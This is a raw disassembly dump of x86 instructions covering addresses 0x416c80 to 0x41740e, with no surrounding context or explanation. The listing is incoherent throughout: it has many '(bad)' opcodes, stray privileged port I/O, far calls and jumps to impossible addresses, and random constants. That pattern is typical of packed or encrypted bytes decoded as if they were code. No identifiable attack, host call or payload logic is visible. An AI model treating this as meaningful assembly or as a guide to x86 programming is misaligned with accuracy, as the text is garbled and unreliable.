  416c80:	mov    BYTE PTR [edx-0x1819e9af],bl
  416c86:	mov    ecx,0x272af576
  416c8b:	lds    edx,FWORD PTR [edx]
  416c8d:	shl    DWORD PTR [ebx],cl
  416c8f:	push   ebx
  416c90:	ins    BYTE PTR es:[edi],dx
  416c91:	outs   dx,BYTE PTR ds:[esi]
  416c92:	ins    BYTE PTR es:[edi],dx
  416c93:	mov    cl,0xbd
  416c95:	mov    ch,0x45
  416c97:	mov    ebx,0xa27c61dd
  416c9c:	sub    DWORD PTR [esi+0x556ad4eb],0x3a
  416ca3:	popf   
  416ca4:	push   cs
  416ca5:	(bad)  [esi-0x79]
  416ca8:	dec    ebx
  416ca9:	xchg   edi,eax
  416caa:	das    
  416cab:	shr    DWORD PTR [esi-0x4b],cl
  416cae:	sbb    DWORD PTR ds:0x2a54a71d,ebx
  416cb4:	loop   0x416c98
  416cb6:	xor    BYTE PTR [ecx],bh
  416cb8:	xor    eax,0x65dba74d
  416cbd:	jne    0x416d38
  416cbf:	jmp    0xced94d39
  416cc4:	mov    edx,0x8e83fff
  416cc9:	or     eax,esp
  416ccb:	mov    WORD PTR [ecx+0x7c],?
  416cce:	jl     0x416ccc
  416cd0:	pop    ecx
  416cd1:	test   ah,al
  416cd3:	cld    
  416cd4:	loop   0x416cd8
  416cd6:	mov    ebx,0x8f145bdb
  416cdb:	(bad)
  416cdf:	sbb    BYTE PTR [edx-0x5a2c48b2],bh
  416ce5:	fldcw  WORD PTR [eax+0x52]
  416ce8:	sub    al,0x97
  416cea:	cwde   
  416ceb:	fwait
  416cec:	fwait
  416ced:	(bad)  
  416cee:	jne    0x416d31
  416cf0:	push   ebp
  416cf1:	push   ebp
  416cf2:	mov    edx,0x54a945b6
  416cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cf8:	jb     0x416d54
  416cfa:	and    DWORD PTR [ecx-0x22fd1fb4],ebx
  416d00:	dec    esi
  416d01:	fwait
  416d02:	xchg   esi,eax
  416d03:	ins    DWORD PTR es:[edi],dx
  416d04:	shr    DWORD PTR [esi+esi*1-0x67],cl
  416d08:	popf   
  416d09:	cdq    
  416d0a:	inc    esi
  416d0b:	xlat   BYTE PTR ds:[ebx]
  416d0c:	or     eax,0x5340dd0c
  416d11:	adc    eax,0xafd5fcbe
  416d16:	jno    0x416cf8
  416d18:	das    
  416d19:	or     esi,esi
  416d1b:	retf   0x2fcb
  416d1e:	jns    0x416d62
  416d20:	jl     0x416d74
  416d22:	fs je  0x416d5d
  416d25:	iret   
  416d26:	out    dx,al
  416d27:	rol    DWORD PTR [ecx],0xb7
  416d2a:	outs   dx,BYTE PTR ds:[esi]
  416d2b:	fdivrp st(2),st
  416d2d:	retf   0x8583
  416d30:	loopne 0x416cfc
  416d32:	in     eax,0xa7
  416d34:	mov    bh,al
  416d36:	loop   0x416d20
  416d38:	mov    edx,0xf846698a
  416d3d:	ret    
  416d3e:	aas    
  416d3f:	cli    
  416d40:	xor    ah,BYTE PTR [ebp-0x4c996e9e]
  416d46:	lds    esi,FWORD PTR [ebx]
  416d48:	dec    edi
  416d49:	pop    edi
  416d4a:	inc    esi
  416d4b:	aad    0x54
  416d4d:	sbb    ch,BYTE PTR [ebp-0x1f1271ea]
  416d53:	cmp    BYTE PTR [esi],cl
  416d55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d56:	sbb    DWORD PTR ds:0x8b124891,esp
  416d5c:	lds    edi,FWORD PTR [ecx-0x34e9148d]
  416d62:	retf   
  416d63:	dec    ebx
  416d64:	sub    BYTE PTR [edx+0x7a1f73c2],cl
  416d6a:	add    DWORD PTR [ecx+0x8],ecx
  416d6d:	push   cs
  416d6e:	push   cs
  416d6f:	movaps XMMWORD PTR [ebp+0x912248b],xmm2
  416d76:	into   
  416d77:	lahf   
  416d78:	mov    edi,0x30f0d0c4
  416d7d:	pop    es
  416d7e:	sti    
  416d7f:	sti    
  416d80:	fs xchg edx,esi
  416d83:	pop    ds
  416d84:	(bad)  
  416d85:	pop    edi
  416d86:	jle    0x416d81
  416d88:	lahf   
  416d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d8a:	dec    DWORD PTR [ebx-0x2d0107e1]
  416d90:	pop    ecx
  416d91:	pop    ecx
  416d93:	pop    es
  416d94:	sbb    DWORD PTR [ecx],esp
  416d96:	add    DWORD PTR [ecx+eiz*1+0x7e67f27e],ebx
  416d9d:	outs   dx,BYTE PTR ds:[esi]
  416d9e:	jle    0x416e05
  416da0:	jne    0x416d87
  416da2:	retf   0xe1d1
  416da5:	and    edi,eax
  416da7:	pop    es
  416da8:	inc    edi
  416da9:	or     bh,dl
  416dab:	shl    DWORD PTR [esi+0x1c],0xb6
  416daf:	ss aaa 
  416db1:	mov    eax,0xa322e170
  416db6:	jecxz  0x416d9b
  416db8:	adc    al,0x8e
  416dba:	push   cs
  416dbb:	xchg   ecx,eax
  416dbc:	test   DWORD PTR [edx+eiz*4+0xf0f0ca8],eax
  416dc3:	adc    ecx,DWORD PTR [ebx-0x769b6fd9]
  416dc9:	fwait
  416dca:	out    dx,eax
  416dcb:	mov    ebp,0xa552b54b
  416dd0:	fldcw  WORD PTR [edx+esi*1+0x39]
  416dd4:	xor    eax,0xcccccc9
  416dd9:	aad    0x6a
  416ddb:	xchg   ebp,eax
  416ddc:	js     0x416e0a
  416dde:	mov    cl,0xe1
  416de1:	adc    ebx,edi
  416de3:	sti    
  416de4:	pop    es
  416de5:	and    al,0x92
  416de7:	or     edx,esi
  416de9:	inc    ebx
  416dea:	inc    ebx
  416deb:	push   0xc8ac869a
  416df0:	push   0x38ed8a9a
  416df5:	pop    esi
  416df6:	shr    BYTE PTR [edi+0x2db6c5db],0x4
  416dfd:	add    dl,BYTE PTR [edi]
  416dff:	push   eax
  416e00:	xor    eax,0xb4125915
  416e05:	mov    ebx,0xab52a1d
  416e0a:	dec    edx
  416e0b:	push   ebx
  416e0c:	mov    eax,ds:0x4a92edd3
  416e11:	jns    0x416e5e
  416e13:	or     DWORD PTR [ebp+0x3e528d8e],0x385c70ad
  416e1d:	data16 jae 0x416e93
  416e20:	mov    esi,DWORD PTR [ecx-0x1919ae2f]
  416e26:	out    0x30,al
  416e28:	int    0xe7
  416e2a:	inc    ecx
  416e2b:	inc    eax
  416e2c:	sub    bl,BYTE PTR [ebp-0x7c9c949a]
  416e32:	dec    esi
  416e33:	mov    ebx,0xb4ebae8d
  416e38:	pop    ebx
  416e39:	dec    ebp
  416e3a:	mov    cs,WORD PTR [esi+0x595d598f]
  416e40:	and    DWORD PTR [edi],edi
  416e42:	cmp    al,0xcc
  416e44:	(bad)  
  416e46:	cmp    al,0xb6
  416e48:	ins    DWORD PTR es:[edi],dx
  416e49:	push   ebx
  416e4a:	cmp    BYTE PTR [esi],bh
  416e4c:	inc    edx
  416e4d:	push   ecx
  416e4e:	fs push edx
  416e50:	test   eax,0x9bedc8d4
  416e55:	mov    bh,0x5f
  416e57:	add    bh,BYTE PTR [esi-0x15]
  416e5a:	lods   al,BYTE PTR ds:[esi]
  416e5b:	(bad)  
  416e5c:	loope  0x416de1
  416e5e:	mov    WORD PTR [eax-0x52ef3200],ss
  416e64:	dec    esi
  416e65:	out    0xa5,eax
  416e67:	ins    BYTE PTR es:[edi],dx
  416e68:	ss xchg edi,eax
  416e6a:	cmp    BYTE PTR [esi],bh
  416e6c:	cmp    ah,BYTE PTR [eax-0x18cd6ae]
  416e72:	cld    
  416e73:	and    bh,bl
  416e75:	sti    
  416e76:	sti    
  416e77:	cmp    BYTE PTR [esi-0x77399675],cl
  416e7d:	daa    
  416e7e:	adc    bl,BYTE PTR [esi+0x39311e39]
  416e84:	fcomp  st(3)
  416e86:	mov    ds:0x6c623850,eax
  416e8b:	jl     0x416e29
  416e8d:	ins    BYTE PTR es:[edi],dx
  416e8e:	es mov esp,ebx
  416e91:	sub    ch,0x58
  416e94:	aam    0xeb
  416e96:	jne    0x416e6a
  416e98:	mov    DWORD PTR [ecx+esi*8],eax
  416e9b:	push   0x88b2cb14
  416ea0:	(bad)  
  416ea1:	bound  edi,QWORD PTR [ebx+edi*2-0x1188c90d]
  416ea8:	fadd   QWORD PTR [ebp+0x37]
  416eab:	or     al,0x9e
  416ead:	jnp    0x416ea5
  416eaf:	sbb    dl,bh
  416eb1:	scas   al,BYTE PTR es:[edi]
  416eb2:	cmp    al,0x43
  416eb4:	es popf 
  416eb6:	and    DWORD PTR [edi],esi
  416eb8:	xchg   esp,eax
  416eb9:	shl    DWORD PTR [ecx+0x1c],0xde
  416ebd:	jl     0x416eaa
  416ebf:	sbb    eax,0x2712a5ca
  416ec4:	lds    ecx,FWORD PTR [ecx]
  416ec6:	out    0x67,al
  416ec8:	out    0x79,eax
  416eca:	idiv   dl
  416ecc:	jne    0x416e68
  416ece:	lods   eax,DWORD PTR ds:[esi]
  416ecf:	es adc esp,ebx
  416ed2:	arpl   sp,bx
  416ed4:	mov    ebx,0xf2d2c5b7
  416ed9:	adc    dh,BYTE PTR [esi-0x350a8c9d]
  416edf:	push   ebp
  416ee0:	cs aas 
  416ee2:	jne    0x416e75
  416ee4:	mov    eax,ds:0x4cd910fc
  416ee9:	call   0xbe6f:0x5bc3ab56
  416ef0:	inc    ebp
  416ef1:	mov    ebp,0x6ba8a55a
  416ef6:	pop    esp
  416ef7:	mov    esi,0xbd5a997c
  416efc:	dec    esi
  416efd:	mov    ch,0xe2
  416eff:	stc    
  416f00:	sti    
  416f01:	test   eax,0xf6d19a4c
  416f06:	sbb    bl,dl
  416f08:	xor    esi,DWORD PTR [ebx]
  416f0a:	dec    eax
  416f0b:	mov    dl,0xc2
  416f0d:	out    0xbd,al
  416f0f:	or     eax,0x9626cd5a
  416f14:	gs push ecx
  416f16:	stos   DWORD PTR es:[edi],eax
  416f17:	aad    0xd8
  416f19:	(bad)  
  416f1b:	mov    eax,ds:0xd4f0a95a
  416f20:	in     eax,0x67
  416f22:	fcomp  st(3)
  416f24:	fist   DWORD PTR [edi]
  416f26:	mov    dh,0xd5
  416f28:	stc    
  416f29:	add    al,0x21
  416f2b:	add    DWORD PTR [ecx+ebp*1+0x43380242],ebx
  416f32:	cmp    BYTE PTR [esi-0x3676260b],dl
  416f38:	dec    ecx
  416f39:	cmp    ch,ch
  416f3b:	push   ss
  416f3c:	mov    edx,0x1e1f93a1
  416f41:	es push 0xffffffc6
  416f44:	nop
  416f45:	fs cdq 
  416f47:	inc    esi
  416f48:	mov    ds:0x640b248e,eax
  416f4d:	pop    ecx
  416f4e:	and    DWORD PTR [esi+0x7c747048],ebx
  416f54:	dec    eax
  416f55:	mov    cl,0x58
  416f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f58:	fldcw  WORD PTR [edx+edx*1-0x47]
  416f5c:	sbb    al,0xe1
  416f5e:	fdivr  QWORD PTR [ecx-0x1311138d]
  416f64:	xchg   edx,eax
  416f65:	int    0x65
  416f67:	cmp    BYTE PTR [ecx],ch
  416f69:	xchg   ebp,eax
  416f6a:	imul   esi,DWORD PTR [esi],0x83b6d8ea
  416f70:	mov    ds:0x828a2828,al
  416f75:	lods   al,BYTE PTR ds:[esi]
  416f76:	enter  0x8e38,0x8d
  416f7a:	nop
  416f7b:	add    al,0x91
  416f7d:	mov    BYTE PTR [ecx+0x3a],al
  416f80:	xchg   ebx,eax
  416f81:	sbb    DWORD PTR es:[edi-0x2ac9249d],ecx
  416f88:	push   0xffffff85
  416f8a:	push   esi
  416f8b:	mov    ebx,0x255ab549
  416f90:	push   ss
  416f91:	lea    esp,[eax+0x76ad2aeb]
  416f97:	xchg   DWORD PTR [eax-0x3c],ebx
  416f9a:	shl    BYTE PTR [ecx+0x1d],0x5a
  416f9e:	lods   eax,DWORD PTR ds:[esi]
  416f9f:	es mov dl,0x2c
  416fa2:	and    ecx,DWORD PTR [ecx+0x2]
  416fa5:	and    DWORD PTR [edx+ebx*1],esp
  416fa8:	lea    esp,[esi]
  416faa:	call   0x4ce9:0xed962aa
  416fb1:	sbb    dl,bh
  416fb3:	jne    0x416f4e
  416fb5:	cdq    
  416fb6:	popf   
  416fb7:	gs ja  0x417031
  416fba:	xchg   edi,eax
  416fbb:	in     eax,0xa5
  416fbd:	mov    ah,BYTE PTR gs:[ebp+0x5c2e1722]
  416fc4:	in     al,0xc2
  416fc6:	lds    ecx,FWORD PTR [ebx-0x5c]
  416fc9:	rcr    DWORD PTR [ecx],cl
  416fcb:	mov    ds:0x4a9518d1,al
  416fd0:	sbb    DWORD PTR [ebp-0x6f],eax
  416fd3:	dec    ecx
  416fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fd5:	ror    BYTE PTR [esp+ecx*2+0x4e],cl
  416fd9:	mov    dl,0xb3
  416fdb:	mov    ch,0x4d
  416fdd:	mov    ecx,0x24924254
  416fe2:	dec    esi
  416fe3:	dec    esi
  416fe4:	mov    gs,WORD PTR [ecx]
  416fe6:	xchg   ebp,eax
  416fe7:	mov    dh,BYTE PTR [esp+ebp*1-0x15]
  416feb:	sar    edi,cl
  416fed:	out    0x6f,eax
  416fef:	std    
  416ff0:	mov    dh,0xf2
  416ff2:	xchg   edi,eax
  416ff3:	ds neg ecx
  416ff6:	jo     0x416fa5
  416ff8:	shl    BYTE PTR [ebx],0x42
  416ffb:	dec    eax
  416ffc:	add    BYTE PTR [edi-0x7c],ah
  416fff:	jg     0x416ff1
  417001:	adc    edi,DWORD PTR [edi]
  417003:	xchg   ebp,eax
  417004:	mov    ch,0xac
  417006:	out    dx,al
  417007:	retf   
  417008:	mov    dl,0x90
  41700a:	mov    eax,0xa612e170
  41700f:	imul   edx,DWORD PTR [eax+0x2e],0xef555096
  417016:	xor    DWORD PTR [ebx-0x33],ebx
  417019:	and    WORD PTR [ebp-0x6597b445],0xa
  417021:	scas   al,BYTE PTR es:[edi]
  417022:	dec    ebx
  417023:	and    al,0x62
  417025:	mov    ds:0x20b82aa9,al
  41702a:	sub    ecx,DWORD PTR [edx]
  41702c:	(bad)  [edx+ebx*1+0x45]
  417030:	xchg   esi,eax
  417031:	leave  
  417032:	data16 rcr BYTE PTR [esp+ebx*4-0x49454f64],cl
  41703a:	push   cs
  41703b:	scas   al,BYTE PTR es:[edi]
  41703c:	dec    ebx
  41703d:	stos   DWORD PTR es:[edi],eax
  41703e:	frstor [esi+0x66]
  417041:	jp     0x417049
  417043:	inc    ebp
  417044:	xchg   edx,eax
  417045:	mov    esp,0x93114249
  41704a:	pop    ebx
  41704b:	ja     0x416fe3
  41704d:	(bad)  
  41704f:	fldenv [ecx]
  417051:	lahf   
  417052:	pop    ds
  417053:	bound  esp,QWORD PTR [edx+0x62]
  417056:	xor    BYTE PTR [ebx-0x75],0x8b
  41705a:	in     al,dx
  41705b:	in     eax,dx
  41705c:	in     eax,dx
  41705d:	xor    edi,DWORD PTR [ebx]
  41705f:	xor    ecx,DWORD PTR [ebx-0x5f]
  417062:	pop    eax
  417063:	fs ja  0x4170dd
  417066:	(bad)
  41706a:	aam    0xe4
  41706c:	adc    al,0x43
  41706e:	mov    ecx,0x6778b1c
  417073:	xchg   ebx,eax
  417074:	out    dx,al
  417075:	add    BYTE PTR [eax],al
  417077:	and    BYTE PTR [eax],al
  417079:	dec    ecx
  41707a:	inc    esp
  41707b:	inc    ecx
  41707c:	push   esp
  41707d:	mov    ecx,DWORD PTR [ebx-0x76d732bc]
  417083:	js     0x417021
  417085:	imul   DWORD PTR [esi-0x24]
  417088:	in     al,0xde
  41708a:	mov    BYTE PTR [esi],0x91
  41708d:	mov    cl,al
  41708f:	repz iret 
  417091:	cmp    eax,0x5ecf73c7
  417096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417097:	jo     0x4170eb
  417099:	bound  esp,QWORD PTR fs:[edx-0x74]
  41709d:	jnp    0x417096
  41709f:	sub    DWORD PTR ss:[esi+ecx*4],edx
  4170a3:	inc    ecx
  4170a4:	or     BYTE PTR [ebx+ebx*8],ch
  4170a7:	mov    ds:0xb3b3ab59,al
  4170ac:	mov    ch,0x85
  4170ae:	and    al,0xcb
  4170b0:	and    al,0x52
  4170b2:	dec    ecx
  4170b3:	scas   al,BYTE PTR es:[edi]
  4170b4:	pop    ebp
  4170b5:	jg     0x41704d
  4170b7:	push   esi
  4170b8:	mov    ebx,0xe3972645
  4170bd:	pusha  
  4170be:	jg     0x4170df
  4170c0:	dec    ecx
  4170c1:	or     BYTE PTR [esi+0x66],ah
  4170c4:	data16 xor BYTE PTR [ebx+edx*8+0x5b],cl
  4170c9:	fcmovnbe st,st(0)
  4170cb:	mov    ebp,cs
  4170cd:	outs   dx,DWORD PTR ds:[esi]
  4170ce:	out    dx,al
  4170cf:	in     al,dx
  4170d0:	pop    ebp
  4170d1:	pop    es
  4170d2:	mov    esi,0xf1e3d671
  4170d7:	inc    ecx
  4170d8:	inc    ebp
  4170d9:	dec    eax
  4170da:	add    BYTE PTR [edi+0x4],ah
  4170dd:	inc    ebp
  4170de:	xchg   edx,eax
  4170df:	sahf   
  4170e0:	xor    edx,DWORD PTR [ebx-0x42222e57]
  4170e6:	ins    DWORD PTR es:[edi],dx
  4170e7:	xchg   BYTE PTR [edi-0x67a067ba],al
  4170ed:	arpl   WORD PTR [edi+0x67],bp
  4170f0:	mov    edx,ebx
  4170f2:	rcl    DWORD PTR [ebx-0x7c],cl
  4170f5:	sub    al,0x11
  4170f7:	shl    DWORD PTR [ebp-0x7c],1
  4170fa:	sbb    BYTE PTR [edx-0x4b],0x46
  4170fe:	mov    bl,0xd1
  417100:	fs icebp 
  417102:	cld    
  417103:	cmp    DWORD PTR [ecx+ecx*2],esp
  417106:	and    ah,BYTE PTR [edx+0x78]
  417109:	mov    bl,0xf2
  41710b:	ss out dx,al
  41710d:	ins    DWORD PTR es:[edi],dx
  41710e:	push   eax
  41710f:	lods   eax,DWORD PTR ds:[esi]
  417110:	xlat   BYTE PTR ds:[ebx]
  417111:	nop
  417112:	and    al,0x81
  417114:	in     eax,dx
  417115:	mov    eax,0xa34aaa68
  41711a:	fld    st(4)
  41711c:	jne    0x41713b
  41711e:	and    ah,BYTE PTR [esi+0x30c8c8c1]
  417124:	mov    dl,0xa2
  417126:	adc    BYTE PTR ds:0xbadd6e4d,dh
  41712c:	dec    ebp
  41712d:	mov    cl,0x58
  41712f:	mov    al,ds:0x30b3acd1
  417134:	aas    
  417135:	(bad)  
  417136:	fmul   st(4),st
  417138:	or     al,0x99
  41713a:	dec    esp
  41713b:	xchg   esi,eax
  41713c:	jl     0x41716c
  41713e:	(bad)
  417141:	add    DWORD PTR [ebx+0x6b],ebp
  417144:	imul   esi,DWORD PTR [edx+edi*4+0x5d],0x12
  417149:	mov    DWORD PTR [eax],edi
  41714b:	mov    esi,ebx
  41714d:	push   ebx
  41714e:	call   0x2b6dfc0d
  417153:	sbb    BYTE PTR [edx-0x5aa94aba],bl
  417159:	aad    0x6e
  41715b:	mov    eax,ds:0x2c920aa8
  417160:	popa   
  417161:	pop    ecx
  417162:	ss xchg ebp,eax
  417164:	rcl    DWORD PTR [ebx+0xa],cl
  417167:	xchg   BYTE PTR [esi-0x3b273d15],cl
  41716d:	add    al,0x9a
  41716f:	stos   BYTE PTR es:[edi],al
  417170:	xor    bh,BYTE PTR [esi]
  417172:	xor    ecx,eax
  417174:	rcl    dl,cl
  417176:	pop    ebp
  417177:	mov    dh,0xb6
  417179:	ss nop
  41717b:	and    al,0x89
  41717d:	(bad)  
  41717e:	dec    esp
  41717f:	mov    esi,0xa942eb8c
  417184:	pop    esp
  417185:	bound  edi,QWORD PTR [edi+0x77]
  417188:	(bad)  
  417189:	push   esp
  41718a:	sub    cl,ch
  41718c:	in     eax,0x67
  41718e:	scas   al,BYTE PTR es:[edi]
  41718f:	nop
  417190:	dec    esp
  417191:	and    eax,0x253d3d39
  417196:	cmp    esi,DWORD PTR [esp+eax*2]
  417199:	sub    al,0x1a
  41719b:	push   edi
  41719c:	add    al,0xee
  41719e:	sub    eax,DWORD PTR [esp+eax*1+0xb086670]
  4171a5:	or     esi,0x5e2ee708
  4171ab:	cli    
  4171ac:	mov    eax,ds:0xe1fe3468
  4171b1:	inc    edx
  4171b2:	loope  0x41714c
  4171b4:	mov    ds:0xb3e50ce,ax
  4171ba:	cs push esp
  4171bc:	sub    dl,BYTE PTR ds:0xe336adda
  4171c2:	adc    edx,DWORD PTR [ebx]
  4171c4:	vfmsubps xmm5,xmm1,XMMWORD PTR [ebx-0x3b66ddb5],xmm0
  4171ce:	inc    esi
  4171cf:	adc    DWORD PTR [edx-0x70],eax
  4171d2:	leave  
  4171d3:	data16 xor BYTE PTR [ebp-0x696888f8],cl
  4171da:	sub    BYTE PTR ds:0x4d9a348b,dl
  4171e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171e1:	es daa 
  4171e3:	dec    ecx
  4171e4:	and    al,0x62
  4171e6:	les    esp,FWORD PTR [edx+0x79f28631]
  4171ec:	mov    cs,WORD PTR [edx]
  4171ee:	add    eax,0xa9969696
  4171f3:	(bad)  
  4171f4:	push   0x48
  4171f6:	mov    dl,0x8c
  4171f8:	adc    BYTE PTR [edx+0x5e5ab56],al
  4171fe:	adc    DWORD PTR [ebx],edx
  417200:	jno    0x4171ac
  417202:	mov    ch,0x2a
  417204:	sti    
  417205:	sti    
  417206:	pop    es
  417207:	sbb    BYTE PTR [edx-0x5e2254bf],bh
  41720d:	shr    DWORD PTR [eax-0x60],1
  417210:	test   al,0xa
  417212:	mov    ds:0x3638a3a3,eax
  417217:	lods   al,BYTE PTR ds:[esi]
  417218:	scas   al,BYTE PTR es:[edi]
  417219:	scas   al,BYTE PTR es:[edi]
  41721a:	push   ecx
  41721b:	sub    BYTE PTR [esi],dl
  41721d:	xchg   ecx,eax
  41721e:	and    al,0x19
  417220:	ror    DWORD PTR [eax+eiz*8-0x3118f128],cl
  417227:	popf   
  417228:	inc    edi
  417229:	xchg   edx,eax
  41722a:	and    al,0xde
  41722c:	mov    ebx,0xb5b58371
  417231:	xor    eax,0x8b0eadda
  417236:	out    0x16,eax
  417238:	enter  0x3264,0x24
  41723c:	xchg   ebx,eax
  41723d:	imul   esp,edx,0x3b3b38f1
  417243:	fistp  DWORD PTR [esp+edx*1+0x2992240b]
  41724a:	int3   
  41724b:	mov    cl,cl
  41724d:	cli    
  41724e:	fisubr DWORD PTR [edx]
  417250:	sub    ecx,DWORD PTR [ebx+0x4b]
  417253:	test   al,0x9a
  417255:	into   
  417256:	fdiv   st(4),st
  417258:	cmp    al,0xad
  41725a:	mov    bp,WORD PTR [edx-0x1b]
  41725e:	xchg   esp,eax
  41725f:	outs   dx,BYTE PTR ds:[esi]
  417260:	xlat   BYTE PTR ds:[ebx]
  417261:	and    bl,BYTE PTR [edi-0x572e59e1]
  417267:	push   ebx
  417268:	test   eax,0xfa3fccd4
  41726d:	sbb    edi,0xfffffffb
  417270:	in     eax,0xb3
  417272:	push   ds
  417273:	(bad)  
  417274:	cvtpi2ps xmm0,QWORD PTR [edx+0xb]
  417278:	loopne 0x417286
  41727a:	lock aaa 
  41727c:	jle    0x417262
  41727e:	out    dx,eax
  41727f:	stos   BYTE PTR es:[edi],al
  417280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417281:	xchg   ebx,eax
  417282:	shl    BYTE PTR [edi+0x1e26db1c],cl
  417288:	mov    edx,DWORD PTR [ebx-0x57]
  41728b:	xchg   esp,eax
  41728c:	test   al,0x56
  41728e:	dec    esi
  41728f:	cdq    
  417290:	lahf   
  417291:	pop    ebx
  417292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417293:	push   esi
  417294:	stos   DWORD PTR es:[edi],eax
  417295:	mov    ds:0xaa9a2aaa,al
  41729a:	bound  eax,QWORD PTR [esi+0x4c]
  41729d:	loop   0x417290
  41729f:	add    al,0x89
  4172a1:	fs xchg edx,eax
  4172a3:	std    
  4172a4:	mov    ebp,0xe8e8e7d
  4172a9:	enter  0xd0d,0x31
  4172ad:	xor    bh,BYTE PTR [edx+eax*2]
  4172b0:	sub    al,0x16
  4172b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172b3:	pop    esi
  4172b4:	scas   eax,DWORD PTR es:[edi]
  4172b5:	and    ecx,DWORD PTR [ecx]
  4172b7:	sub    DWORD PTR [ebx+ecx*2],0x62291324
  4172be:	mov    cl,0x38
  4172c0:	mov    cl,0x58
  4172c2:	mov    ebx,es
  4172c4:	mov    ds:0xf6f6f623,eax
  4172c9:	push   eax
  4172ca:	fs test esp,edi
  4172cd:	push   eax
  4172ce:	mov    fs,WORD PTR [edi-0x68d861d2]
  4172d4:	int    0x92
  4172d6:	int    0xa4
  4172d8:	call   0xe5be2e91
  4172dd:	popf   
  4172de:	ja     0x417289
  4172e0:	pushf  
  4172e1:	xchg   esi,eax
  4172e2:	imul   esi,DWORD PTR [esi],0x72bb5c1b
  4172e8:	test   esp,eax
  4172ea:	jae    0x4172bb
  4172ec:	shr    BYTE PTR [eax-0x4b],cl
  4172ef:	sbb    BYTE PTR [ebx],bl
  4172f1:	push   ds
  4172f2:	loop   0x4172ba
  4172f4:	int    0xbb
  4172f6:	ins    BYTE PTR es:[edi],dx
  4172f7:	ins    BYTE PTR es:[edi],dx
  4172f8:	outs   dx,BYTE PTR ds:[esi]
  4172f9:	loopne 0x4172b5
  4172fb:	xor    BYTE PTR [ebp+ecx*8+0x4730b8b2],dl
  417302:	cmp    al,0x91
  417304:	and    BYTE PTR [ebp+0x1c0f7848],dl
  41730a:	sub    DWORD PTR [esi],edx
  41730c:	jno    0x41732a
  41730e:	sbb    ecx,ebx
  417310:	mov    dh,0x70
  417312:	sbb    al,0x87
  417314:	xchg   ebx,eax
  417315:	xchg   ebx,eax
  417316:	adc    ecx,DWORD PTR [esi-0x35]
  417319:	xor    bl,BYTE PTR gs:[ecx+0x13e3e32c]
  417320:	test   al,0xaa
  417322:	(bad)  
  417323:	call   0x8839c00
  417328:	fidivr WORD PTR [ebp-0x19]
  41732b:	ins    DWORD PTR es:[edi],dx
  41732c:	inc    eax
  41732d:	sub    bl,0x52
  417330:	sub    al,0x14
  417332:	pop    eax
  417333:	pop    ebp
  417334:	pop    ebp
  417335:	mov    ds:0xf971ad56,al
  41733a:	cdq    
  41733b:	sub    esi,DWORD PTR [edx+ebx*4]
  41733e:	or     eax,0x48b6b7b6
  417343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417344:	push   edx
  417345:	iret   
  417346:	cld    
  417347:	clc    
  417348:	pop    ss
  417349:	(bad)  
  41734a:	out    0x99,eax
  41734c:	mov    edi,0xabffb7fb
  417351:	lea    esi,[ebx+0x220f971e]
  417357:	inc    edx
  417358:	add    bh,BYTE PTR [eax]
  41735a:	add    eax,DWORD PTR [esp+ecx*4-0x38]
  41735e:	shr    ebp,cl
  417360:	pop    eax
  417361:	ja     0x417384
  417363:	popf   
  417364:	leave  
  417365:	xor    dh,BYTE PTR [esi]
  417367:	ds (bad) 
  417369:	cli    
  41736a:	cli    
  41736b:	xor    al,BYTE PTR [esi+0x4c446261]
  417371:	out    0x17,al
  417373:	push   ss
  417374:	mov    DWORD PTR [eax],ebx
  417376:	push   es
  417377:	cmc    
  417378:	jp     0x417307
  41737a:	jp     0x417339
  41737c:	dec    ecx
  41737d:	xor    al,0x1a
  41737f:	and    eax,0xe9d2cd93
  417384:	jbe    0x4173ae
  417386:	xchg   edi,eax
  417387:	dec    edx
  417388:	mov    ah,0x5b
  41738a:	sub    eax,0x5c437286
  41738f:	mov    eax,0x32648178
  417394:	inc    ebp
  417395:	ss xchg ebx,eax
  417397:	mov    eax,ds:0xf1ca7a74
  41739c:	shl    DWORD PTR [ecx],1
  41739e:	push   esi
  41739f:	mov    bh,0xc3
  4173a1:	in     al,0xd4
  4173a3:	adc    al,0xaa
  4173a5:	jmp    0xf005:0x6452124d
  4173ac:	mov    ah,0x7f
  4173ae:	lods   eax,DWORD PTR ds:[esi]
  4173af:	push   esi
  4173b0:	and    edx,DWORD PTR [esi]
  4173b2:	mov    esp,DWORD PTR [edx-0x25]
  4173b5:	mov    ch,BYTE PTR ss:[ebx+edi*2]
  4173b9:	dec    ebx
  4173ba:	test   bl,bl
  4173bc:	ss mov gs,ebx
  4173bf:	loopne 0x4173f9
  4173c1:	ss popf 
  4173c3:	jbe    0x417360
  4173c5:	push   esi
  4173c6:	mov    ebx,0x6465908b
  4173cb:	pop    ecx
  4173cc:	(bad)  
  4173cd:	xor    BYTE PTR [edx],ah
  4173cf:	fdiv   DWORD PTR [esi-0x41d6d215]
  4173d5:	jle    0x417366
  4173d7:	push   esp
  4173d8:	xor    cl,BYTE PTR [ecx-0x6467b99f]
  4173de:	pop    edi
  4173df:	loopne 0x417395
  4173e1:	pop    esp
  4173e2:	out    0xe2,al
  4173e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173e5:	or     ebp,esp
  4173e7:	out    dx,eax
  4173e8:	in     eax,dx
  4173e9:	jae    0x4173e6
  4173eb:	out    0x4d,al
  4173ed:	push   0xfffffff5
  4173ef:	cmp    dl,BYTE PTR [edi-0x51]
  4173f2:	pop    esp
  4173f3:	gs jbe 0x417474
  4173f6:	push   cs
  4173f7:	dec    ebp
  4173f8:	rcl    DWORD PTR [ecx+0x14],cl
  4173fb:	outs   dx,DWORD PTR ds:[esi]
  4173fc:	xor    DWORD PTR [eax-0x3bb6cdbc],edx
  417402:	mov    WORD PTR [eax],?
  417404:	xor    eax,0xc6e6c53d
  417409:	lds    esp,FWORD PTR es:[edx+0x9]
  41740d:	push   ebp
  41740e:	push   ebx
